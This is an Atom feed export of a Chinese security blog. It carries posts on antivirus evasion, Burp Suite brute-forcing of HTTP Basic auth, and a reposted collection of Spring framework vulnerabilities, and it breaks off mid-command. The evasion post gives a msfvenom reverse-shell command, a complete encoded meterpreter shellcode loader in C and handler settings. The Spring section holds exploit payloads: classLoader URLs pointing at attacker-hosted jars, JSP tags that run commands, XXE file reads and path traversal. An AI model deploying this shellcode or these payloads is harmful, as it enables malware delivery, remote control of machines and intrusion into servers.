        &lt;h2 id=&quot;审计记录&quot;&gt;&lt;a href=&quot;#审计记录&quot; class=&quot;headerlink&quot; title=&quot;审计记录&quot;&gt;&lt;/a&gt;审计记录&lt;/h2&gt;&lt;p&gt;记录，有时间就慢慢补充。&lt;/p&gt;
&lt;h2 id=&quot;0x00-74CMS&quot;&gt;&lt;a href=&quot;#0x00-74CMS&quot; cla
      
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://bai-ren-1.github.io/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>免杀入门</title>
    <link href="http://bai-ren-1.github.io/2020/09/05/%E5%85%8D%E6%9D%80%E5%85%A5%E9%97%A8/"/>
    <id>http://bai-ren-1.github.io/2020/09/05/%E5%85%8D%E6%9D%80%E5%85%A5%E9%97%A8/</id>
    <published>2020-09-05T05:21:16.000Z</published>
    <updated>2020-09-05T07:47:21.039Z</updated>
    
    <content type="html"><![CDATA[<h1 id="免杀入门"><a href="#免杀入门" class="headerlink" title="免杀入门"></a>免杀入门</h1><p>学习一下入门级别的免杀，记录一下。这里没啥环境测试环境就只使用火绒。</p><h2 id="0x00-无免杀"><a href="#0x00-无免杀" class="headerlink" title="0x00 无免杀"></a>0x00 无免杀</h2><p><img src="/2020/09/05/%E5%85%8D%E6%9D%80%E5%85%A5%E9%97%A8/1.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.2.108 LPORT=3333 -f exe -o origin.exe</span><br></pre></td></tr></table></figure><p>不做免杀直接生成，然后顺利被火绒所杀。</p><h2 id="0x01-C-免杀"><a href="#0x01-C-免杀" class="headerlink" title="0x01 C++免杀"></a>0x01 C++免杀</h2><h3 id="指针执行"><a href="#指针执行" class="headerlink" title="指针执行"></a>指针执行</h3><p>这是最常规的一种加载shellcode的方法，使用指针来执行函数，所以免杀效果可能比较一般 。先用Msfvenom生成c语言的shellcode，为了提高免杀效果，使用了shikata_ga_nai编码器：</p><p><img src="/2020/09/05/%E5%85%8D%E6%9D%80%E5%85%A5%E9%97%A8/2.png" alt></p><p>查看生成的shellcode.c中的shellcode：</p><p><img src="/2020/09/05/%E5%85%8D%E6%9D%80%E5%85%A5%E9%97%A8/3.png" alt></p><p>将上面的shellcode复制到加载器的“shellcode”处：</p><p><img src="/2020/09/05/%E5%85%8D%E6%9D%80%E5%85%A5%E9%97%A8/4.png" alt></p><blockquote><p>注意C++项目要添加C文件，需要在上方菜单栏“视图 -&gt; 解决方案资源管理器 -&gt; 右侧的菜单栏中选择源文件添加”才能加到项目中。下面放上来的是免杀的加载器代码。</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> buf[] =</span><br><span class="line"><span class="comment">//"shellcode";</span></span><br><span class="line"><span class="string">"\xda\xc1\xd9\x74\x24\xf4\x58\x33\xc9\xb1\x78\xbe\x21\xf2\x28"</span></span><br><span class="line"><span class="string">"\xb4\x31\x70\x17\x03\x70\x17\x83\xe1\xf6\xca\x41\x3c\x37\xd3"</span></span><br><span class="line"><span class="string">"\xde\x9a\x4c\x59\xa2\x04\x8c\x24\x83\xf9\x04\x99\x45\xc8\xfe"</span></span><br><span class="line"><span class="string">"\xc2\x26\xc2\x03\xf1\x40\xba\xf8\x23\xcd\xa5\x11\xae\xa8\xb2"</span></span><br><span class="line"><span class="string">"\xeb\x1a\xdb\x13\x07\xe5\xe7\x05\x4a\x94\x7f\xf1\x17\xd5\x66"</span></span><br><span class="line"><span class="string">"\x1c\x40\xd5\x64\x89\xdf\xe3\x47\x81\x1e\x57\xd4\xae\xa2\xc5"</span></span><br><span class="line"><span class="string">"\x71\x60\xe2\x9b\xc8\x48\xca\x31\xdf\x3e\x81\xaf\xa1\x79\x2a"</span></span><br><span class="line"><span class="string">"\xd3\xcf\x84\xee\x10\xbf\xff\x46\x59\xa4\xe1\x9e\x0b\x8d\x21"</span></span><br><span class="line"><span class="string">"\x7a\x89\x49\xa9\x77\xdd\xda\x70\xf8\x4f\xa2\xc8\x85\x76\x36"</span></span><br><span class="line"><span class="string">"\x4f\xbe\x44\x49\xae\x95\x49\xe0\xc5\xa2\x27\x9a\xfc\x97\xa7"</span></span><br><span class="line"><span class="string">"\x53\x0c\x59\x52\x26\x7f\x2e\x55\x57\x6d\x04\xb4\x45\x03\x73"</span></span><br><span class="line"><span class="string">"\x45\x7f\xbc\xa5\x47\xd8\xbb\x99\xa1\x7c\xf7\x3d\x67\xca\x4b"</span></span><br><span class="line"><span class="string">"\x4a\xd5\x6d\xed\xe7\xe6\x9a\xa8\xc1\xa1\x26\x4d\x27\x1a\x05"</span></span><br><span class="line"><span class="string">"\x38\x4d\x42\x12\x72\xcf\xff\xd9\x88\x6b\xbe\x88\xeb\xba\x7a"</span></span><br><span class="line"><span class="string">"\x2f\xa3\x63\x2b\x3e\x08\x4f\x30\xdd\xe5\xaa\xbe\x8b\x4a\x03"</span></span><br><span class="line"><span class="string">"\xba\x2f\xa9\xed\xc3\x5e\x72\x46\xfd\x46\x37\xdb\xf0\xaf\x55"</span></span><br><span class="line"><span class="string">"\x56\xef\x46\xc8\x7e\x56\x4c\x05\xc5\x09\x87\x1f\x65\xbe\xd7"</span></span><br><span class="line"><span class="string">"\x85\xe3\xbb\x40\xe6\xe3\x96\x6c\xa0\x40\x0f\x40\x1b\xa2\x3f"</span></span><br><span class="line"><span class="string">"\xe2\xc6\x4b\x13\x71\x4a\x54\xde\x44\xb8\x32\xf3\x10\x90\x16"</span></span><br><span class="line"><span class="string">"\x11\xde\x9e\xf3\x6d\xf9\x08\xcc\x88\xfd\x9a\xf8\xcc\x5a\x8e"</span></span><br><span class="line"><span class="string">"\xa7\x24\x42\x04\xe2\x13\xa9\xbc\xac\xb5\x5c\xec\xc0\x1c\x81"</span></span><br><span class="line"><span class="string">"\x23\x7e\xee\xcc\xb6\xce\xd3\x19\x0b\xbf\x32\x20\x52\x3b\x61"</span></span><br><span class="line"><span class="string">"\x0f\xf9\xf7\x2a\x3f\xc0\xc8\x7d\x9c\x85\x81\x52\xbe\x4a\x1c"</span></span><br><span class="line"><span class="string">"\x1b\xc8\x3e\x4b\x38\xdb\x92\xb2\xfa\x31\x38\x07\xdc\x38\xc7"</span></span><br><span class="line"><span class="string">"\x9f\x9a\x8f\x34\xc8\x36\x24\x33\xd8\xd1\x20\x73\xc5\x6a\x66"</span></span><br><span class="line"><span class="string">"\xf1\xa1\xa5\xda\xf9\xa7\x03\x8e\x98\xc3\x03\x8a\x4a\x1c\xa3"</span></span><br><span class="line"><span class="string">"\x2b\x3a\x46\xd8\x89\x71\x75\xa8\xa8\xb9\x78\x7c\x4d\x9b\x70"</span></span><br><span class="line"><span class="string">"\x5a\xc0\xaf\xb6\xe2\xbc\x82\x63\x5d\x03\x98\xc5\x67\x57\xe8"</span></span><br><span class="line"><span class="string">"\xbc\xf0\x5b\x9f\x30\x4b\x09\xd0\x1b\x27\xfe\x26\x6d\xc9\x35"</span></span><br><span class="line"><span class="string">"\x6c\xd8\x3d\x9b\x4a\x0d\x1c\x55\xca\xaf\x8a\xab\xc9\xbb\xc0"</span></span><br><span class="line"><span class="string">"\xcf\x44\x27\xc6\x08\xcf\xe1\xf6\x3e\xb6\x24\x90\xe6\xc6\x6f"</span></span><br><span class="line"><span class="string">"\x44\xac\xb7\xcb\x04\x44\xe8\x50\x3d\xda\xa0\x3b\x52\x27\x36"</span></span><br><span class="line"><span class="string">"\xa5\x7d\x09\xf6\x53\x84\x94\x91\x3a\xb9\xbd\x9e\x87\xbb\x1f"</span></span><br><span class="line"><span class="string">"\xfc\x6a\xb2\x70\xce\x21\x77\x84"</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(linker,<span class="meta-string">"/subsystem:\"Windows\" /entry:\"mainCRTStartup\""</span>) <span class="comment">//windows控制台程序不出黑窗口</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ((<span class="keyword">void</span>(*)(<span class="keyword">void</span>)) &amp; buf)();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>选择上面菜单栏的“生成 -&gt; 生成project1”就能在debug目录下拿到exe程序啦。</p></blockquote><p>首先进行上线的实验，在kali的msf中执行下面这些代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set LHOST 192.168.2.108 </span><br><span class="line">set LPORT 3333</span><br><span class="line">set EnableStageEncoding true</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;免杀入门&quot;&gt;&lt;a href=&quot;#免杀入门&quot; class=&quot;headerlink&quot; title=&quot;免杀入门&quot;&gt;&lt;/a&gt;免杀入门&lt;/h1&gt;&lt;p&gt;学习一下入门级别的免杀，记录一下。这里没啥环境测试环境就只使用火绒。&lt;/p&gt;
&lt;h2 id=&quot;0x00-无免杀&quot;&gt;&lt;a hr
      
    
    </summary>
    
    
      <category term="后渗透" scheme="http://bai-ren-1.github.io/categories/%E5%90%8E%E6%B8%97%E9%80%8F/"/>
    
    
  </entry>
  
  <entry>
    <title>Burpsuite爆破Basic认证</title>
    <link href="http://bai-ren-1.github.io/2020/08/24/Burpsuite%E7%88%86%E7%A0%B4Basic%E8%AE%A4%E8%AF%81/"/>
    <id>http://bai-ren-1.github.io/2020/08/24/Burpsuite%E7%88%86%E7%A0%B4Basic%E8%AE%A4%E8%AF%81/</id>
    <published>2020-08-24T08:54:02.000Z</published>
    <updated>2020-09-05T05:25:50.026Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Burpsuite爆破Basic认证"><a href="#Burpsuite爆破Basic认证" class="headerlink" title="Burpsuite爆破Basic认证"></a>Burpsuite爆破Basic认证</h1><p>做个弟弟，记录别人十多年前就用过，自己今天才遇到并记录的东西。</p><h2 id="0x00-起因"><a href="#0x00-起因" class="headerlink" title="0x00 起因"></a>0x00 起因</h2><p>要日一个东西，发现有个Basic认证。抓个包看到其数据是放在了请求包的报文头中。</p><p><img src="/2020/08/24/Burpsuite%E7%88%86%E7%A0%B4Basic%E8%AE%A4%E8%AF%81/1.png" alt></p><p>简单能看出Basic的认证是以<code>用户名：密码</code>形式存在，然后进行Base64编码并发送：</p><p><img src="/2020/08/24/Burpsuite%E7%88%86%E7%A0%B4Basic%E8%AE%A4%E8%AF%81/2.png" alt></p><p>现在要对他进行爆破，就得选择好用户密码两部分的payload，拼接并进行Base64编码后爆破。在BP上怎么实现？</p><h2 id="0x01-实现"><a href="#0x01-实现" class="headerlink" title="0x01 实现"></a>0x01 实现</h2><p>我们依然把认证看做一个整体，随便选择Sniper模式进行爆破。</p><p><img src="/2020/08/24/Burpsuite%E7%88%86%E7%A0%B4Basic%E8%AE%A4%E8%AF%81/3.png" alt></p><blockquote><p>Sniper 单参数爆破，多参数时同一个字典按顺序替换各参数，总之初始值有一个参数不变；</p><p>Battering ram 多参数同时爆破，但用的是同一个字典；</p><p>Pichfork 多参数同时爆破，但用的是不同的字典；</p><p>Cluster bomb 多参数做笛卡尔乘积模式爆破；</p></blockquote><p>套路就在于在设置payload那里可以选择模式，我们选择为<code>Custom iterator</code>。然后根据Basic的三部分去拆分三部分的payload，具体操作如下。首先操作第一部分就是用户名：</p><p><img src="/2020/08/24/Burpsuite%E7%88%86%E7%A0%B4Basic%E8%AE%A4%E8%AF%81/5.png" alt></p><p>第二部分就是分隔符号：</p><p><img src="/2020/08/24/Burpsuite%E7%88%86%E7%A0%B4Basic%E8%AE%A4%E8%AF%81/6.png" alt></p><p>第三部分就是密码：</p><p><img src="/2020/08/24/Burpsuite%E7%88%86%E7%A0%B4Basic%E8%AE%A4%E8%AF%81/7.png" alt></p><p>选择好各个部分的payload后，我们给他加一层Base64编码即可构成字典啦：</p><p><img src="/2020/08/24/Burpsuite%E7%88%86%E7%A0%B4Basic%E8%AE%A4%E8%AF%81/8.png" alt></p><p>爆破。可以看到确实生成了对应格式的Base64编码的payload：</p><p><img src="/2020/08/24/Burpsuite%E7%88%86%E7%A0%B4Basic%E8%AE%A4%E8%AF%81/9.png" alt></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Burpsuite爆破Basic认证&quot;&gt;&lt;a href=&quot;#Burpsuite爆破Basic认证&quot; class=&quot;headerlink&quot; title=&quot;Burpsuite爆破Basic认证&quot;&gt;&lt;/a&gt;Burpsuite爆破Basic认证&lt;/h1&gt;&lt;p&gt;做个弟弟，记
      
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://bai-ren-1.github.io/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>Spring漏洞集合</title>
    <link href="http://bai-ren-1.github.io/2020/08/12/Spring%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/"/>
    <id>http://bai-ren-1.github.io/2020/08/12/Spring%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/</id>
    <published>2020-08-12T12:12:58.000Z</published>
    <updated>2020-08-12T14:35:27.428Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Spring漏洞集合"><a href="#Spring漏洞集合" class="headerlink" title="Spring漏洞集合"></a>Spring漏洞集合</h1><p>转载自<a href="https://misakikata.github.io/2020/04/Spring-%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/" target="_blank" rel="noopener">https://misakikata.github.io/2020/04/Spring-%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/</a></p><h2 id="0x00-CVE-2010-1622-Spring-Framework-class-classLoader类远程代码执行"><a href="#0x00-CVE-2010-1622-Spring-Framework-class-classLoader类远程代码执行" class="headerlink" title="0x00 CVE-2010-1622 Spring Framework class.classLoader类远程代码执行"></a>0x00 CVE-2010-1622 Spring Framework class.classLoader类远程代码执行</h2><blockquote><p>影响版本：SpringSource Spring Framework 3.0.0 - 3.0.2、SpringSource Spring Framework 2.5.0 - 2.5.7</p></blockquote><p>Spring框架提供了一种机制，该机制使用客户端提供的数据来更新对象属性。这个机制允许攻击者修改用于加载对象的类加载器的属性（通过’class.classloader’）。这可能导致任意命令执行，例如，攻击者可以修改URL。由类加载器用来指向攻击者控制的位置。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">示例：POST /adduser HTTP/1.0</span><br><span class="line">...</span><br><span class="line">firstName = Tavis&amp;lastName = Ormandy</span><br><span class="line"></span><br><span class="line">如果Person是表单的支持对象，则firstName和lastName属性将设置为相应的值。为了支持更复杂的类，Spring还支持点表示法，因此user.address.street = Disclosure + Str。</span><br><span class="line"></span><br><span class="line">将等效于：frmObj.getUser().getAddress().setStreet(&quot;Disclosure Str.&quot;)  </span><br><span class="line">问题是Spring Beans的CachedIntrospectionResults类枚举了可从用户表单提交中设置的属性，使用  java.beans.Introspector.getBeanInfo()而不指定停止类，这意味着&apos; class &apos;属性及其后的所有内容均可用于HTTP请求中的设置。</span><br><span class="line"></span><br><span class="line">攻击</span><br><span class="line">如果攻击者使用以下HTTP参数向表单控制器提交HTTP请求：</span><br><span class="line">POST /adduser HTTP/1.0</span><br><span class="line">...</span><br><span class="line">class.classLoader.URLs[0] = jar:http://attacker/spring-exploit.jar!</span><br><span class="line"></span><br><span class="line">它将使用自己的网址覆盖frmObj.getClass().getClassLoader().getURLs() 返回的数组中的第0个元素.它将是哪个类加载器？</span><br><span class="line"></span><br><span class="line">在Apache Tomcat上的情况下，它指org.apache.catalina.loader.WebappClassLoader</span><br></pre></td></tr></table></figure><p>如何构造这个jar，需要包含以下信息：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">- META-INF/spring-form.tld - 定义spring表单标签并指定实现为标签文件而不是类</span><br><span class="line">- META-INF/tags/中的标签文件，包含有标签定义（任意Java代码）</span><br></pre></td></tr></table></figure><p>/META-INF/spring-form.tld文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- &lt;form:input/&gt; tag --&gt;    </span><br><span class="line">&lt;tag-file&gt;    </span><br><span class="line">&lt;name&gt;input&lt;/name&gt;    </span><br><span class="line">&lt;path&gt;/META-INF/tags/InputTag.tag&lt;/path&gt;  </span><br><span class="line">&lt;/tag-file&gt;</span><br></pre></td></tr></table></figure><p>/META-INF/tags/InputTag.tag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ tag dynamic-attributes=&quot;dynattrs&quot; %&gt;</span><br><span class="line">&lt;% </span><br><span class="line">j java.lang.Runtime.getRuntime().exec(&quot;mkdir /tmp/PWNED&quot;); </span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>做出这样的替换后，当开发者在controller中将任何一个对象绑定表单，并且最终展示的jsp内容有下面这些：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ taglib prefix=&quot;form&quot; uri=&quot;http://www.springframework.org/tags/form&quot;%&gt;  </span><br><span class="line">&lt;form:form commandName=&quot;user&quot;&gt;</span><br><span class="line">&lt;form:input path=&quot;name&quot;/&gt;</span><br><span class="line">&lt;/form:form&gt;</span><br></pre></td></tr></table></figure><p>攻击者访问url,即可触发远程代码执行的效果:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://inbreak.net/springmvc/testjsp.htm? class.classLoader.URLs[0]=jar:https://inbreak.net/spring-exploit.jar!/</span><br></pre></td></tr></table></figure><p>如果服务器大于tomcat6.0.28版本，这样做会把所有的input标签替换掉，导致不能正常显示。需要修改</p><p>spring-form.tld，给其中的inputtag改名，name改为inputkxlzx：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;tag&gt;        </span><br><span class="line">&lt;name&gt;inputkxlzx&lt;/name&gt;  //什么名字都行</span><br></pre></td></tr></table></figure><p>在文件中新加入一个tag，叫做input：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;tag-file&gt;    </span><br><span class="line">&lt;name&gt;input&lt;/name&gt;    </span><br><span class="line">&lt;path&gt;/WEB-INF/tags/InputTag.tag&lt;/path&gt;  </span><br><span class="line">&lt;/tag-file&gt;</span><br></pre></td></tr></table></figure><p>InputTag.tag的内容：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ tag dynamic-attributes=&quot;dynattrs&quot; %&gt;</span><br><span class="line">&lt;%if (request.getParameter(&quot;kxlzxcmd&quot;)!=null)     </span><br><span class="line">exec(request.getParameter(&quot;kxlzxcmd&quot;)); </span><br><span class="line">%&gt;</span><br><span class="line">&lt;form:inputkxlzx path=&quot;$&#123;dynattrs.path&#125;&quot;&gt;&lt;/form:inputkxlzx&gt;</span><br></pre></td></tr></table></figure><p>访问的时候需要在参数中携带kxlzxcmd</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/test.htm?name=kxlzx&amp;kxlzxcmd=calc   //包含input的页面</span><br></pre></td></tr></table></figure><p><a href="http://blog.o0o.nu/2010/06/cve-2010-1622.html" target="_blank" rel="noopener">http://blog.o0o.nu/2010/06/cve-2010-1622.html</a></p><p><a href="https://www.inbreak.net/archives/377" target="_blank" rel="noopener">https://www.inbreak.net/archives/377</a></p><h2 id="0x01-CVE-2013-4152-Spring-Framework中的XML外部实体（XXE）注入"><a href="#0x01-CVE-2013-4152-Spring-Framework中的XML外部实体（XXE）注入" class="headerlink" title="0x01 CVE-2013-4152 Spring Framework中的XML外部实体（XXE）注入"></a>0x01 CVE-2013-4152 Spring Framework中的XML外部实体（XXE）注入</h2><blockquote><p>影响版本：3.0.0至3.2.3、4.0.0.M1</p></blockquote><p>受影响版本容易受到XML外部实体（XXE）注入的攻击。该<code>SourceHttpMessageConverter</code>处理器不会禁用外部实体解析，这使远程攻击者可以读取任意文件。</p><p>当传输xml结构体时，如</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;   </span><br><span class="line">&lt;username&gt;John&lt;/username&gt;</span><br><span class="line">&lt;/xml&gt;</span><br></pre></td></tr></table></figure><p>外部XML实体- <code>xxe</code>是使用系统标识符定义的，并存在于DOCTYPE标头中。这些实体可以访问本地或远程内容。例如，以下代码包含一个外部XML实体，该实体将获取的内容 <code>/etc/passwd</code>并将其显示给呈现给用户。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [   </span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;]&gt;   </span><br><span class="line">&lt;username&gt;&amp;xxe;&lt;/username&gt;</span><br><span class="line">&lt;/xml&gt;</span><br></pre></td></tr></table></figure><p>其他XXE注入攻击可以访问可能无法停止返回数据的本地资源，这可能会影响应用程序可用性并导致拒绝服务。</p><h2 id="0x02-CVE-2013-7315-Spring-Framework中的XML外部实体"><a href="#0x02-CVE-2013-7315-Spring-Framework中的XML外部实体" class="headerlink" title="0x02 CVE-2013-7315 Spring Framework中的XML外部实体"></a>0x02 CVE-2013-7315 Spring Framework中的XML外部实体</h2><blockquote><p>影响版本：3.2.0至3.2.3、4.0.0.M1-4.0.0.M2（Spring MVC）</p></blockquote><p>由于对 <strong>CVE-2013-4152</strong>和<strong>CVE-2013-6429的</strong>修复不完整导致。</p><p>受影响版本容易受到XML外部实体（XXE）注入的攻击。该<code>SourceHttpMessageConverter</code>处理器不会禁用外部实体解析，这使远程攻击者可以读取任意文件。</p><p>当传输xml结构体时，如</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;   </span><br><span class="line">&lt;username&gt;John&lt;/username&gt;</span><br><span class="line">&lt;/xml&gt;</span><br></pre></td></tr></table></figure><p>外部XML实体- <code>xxe</code>是使用系统标识符定义的，并存在于DOCTYPE标头中。这些实体可以访问本地或远程内容。例如，以下代码包含一个外部XML实体，该实体将获取的内容 <code>/etc/passwd</code>并将其显示给呈现给用户。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [   </span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;]&gt;   </span><br><span class="line">&lt;username&gt;&amp;xxe;&lt;/username&gt;</span><br><span class="line">&lt;/xml&gt;</span><br></pre></td></tr></table></figure><p>其他XXE注入攻击可以访问可能无法停止返回数据的本地资源，这可能会影响应用程序可用性并导致拒绝服务。</p><h2 id="0x03-CVE-2014-3527-Spring-Security验证绕过漏洞"><a href="#0x03-CVE-2014-3527-Spring-Security验证绕过漏洞" class="headerlink" title="0x03 CVE-2014-3527 Spring Security验证绕过漏洞"></a>0x03 CVE-2014-3527 Spring Security验证绕过漏洞</h2><blockquote><p>影响版本：SpringSource Spring Security 3.1-3.2.4</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">当使用从Spring Security 3.1到3.2.4的CAS代理票证身份验证时，恶意的CAS服务可能会欺骗另一个CAS服务来认证未关联的代理票证。这是由于以下事实：代理票证身份验证使用了来自HttpServletRequest的信息，该信息是根据HTTP请求中的不可信信息填充的。这意味着，如果存在CAS服务可以相互认证的访问控制限制，则可以绕过这些限制。如果用户未使用CAS代理票证，并且未基于CAS服务做出访问控制决策，则对用户没有影响。</span><br></pre></td></tr></table></figure><h2 id="0x04-CVE-2014-0097-Spring-Security认证绕过"><a href="#0x04-CVE-2014-0097-Spring-Security认证绕过" class="headerlink" title="0x04 CVE-2014-0097 Spring Security认证绕过"></a>0x04 CVE-2014-0097 Spring Security认证绕过</h2><blockquote><p>影响版本：Spring Security 3.2.0至3.2.1和3.1.0至3.1.5</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ActiveDirectoryLdapAuthenticator不检查密码长度。如果目录允许匿名绑定，则它可能会错误地验证提供空密码的用户。</span><br></pre></td></tr></table></figure><h2 id="0x05-CVE-2014-3578-Spring-Framework-目录遍历漏洞"><a href="#0x05-CVE-2014-3578-Spring-Framework-目录遍历漏洞" class="headerlink" title="0x05 CVE-2014-3578 Spring Framework 目录遍历漏洞"></a>0x05 CVE-2014-3578 Spring Framework 目录遍历漏洞</h2><p>影响版本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Spring Framework:</span><br><span class="line">- 3.0.4 to 3.2.11</span><br><span class="line">- 4.0.0 to 4.0.7</span><br><span class="line">- 4.1.0 to 4.1.1</span><br></pre></td></tr></table></figure><p>在web.xml存在如下情况下存在目录遍历：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;mvc:resources mapping=&quot;/css/**&quot; location=&quot;file:webapps/springapp/WEB-INF/classes/theme/css/&quot; /&gt;</span><br></pre></td></tr></table></figure><p>访问：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /springapp/css/file:/etc/passwd</span><br></pre></td></tr></table></figure><h2 id="0x06-CVE-2016-2173-Spring-AMQP中的远程代码执行"><a href="#0x06-CVE-2016-2173-Spring-AMQP中的远程代码执行" class="headerlink" title="0x06 CVE-2016-2173 Spring AMQP中的远程代码执行"></a>0x06 CVE-2016-2173 Spring AMQP中的远程代码执行</h2><p>影响版本：1.0.0至1.5.4</p><p><a href="https://github.com/HaToan/CVE-2016-2173" target="_blank" rel="noopener">https://github.com/HaToan/CVE-2016-2173</a></p><p>使用方式：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">- ysoserial-0.0.4-all.jar create payload write and execute a shell    </span><br><span class="line">+ java -jar ysoserial-0.0.4-all.jar &apos;library_vul&apos; &apos;command&apos;</span><br><span class="line"></span><br><span class="line">- exploit-cve2016-2173.jar : send to App vul    </span><br><span class="line">+ java -jar 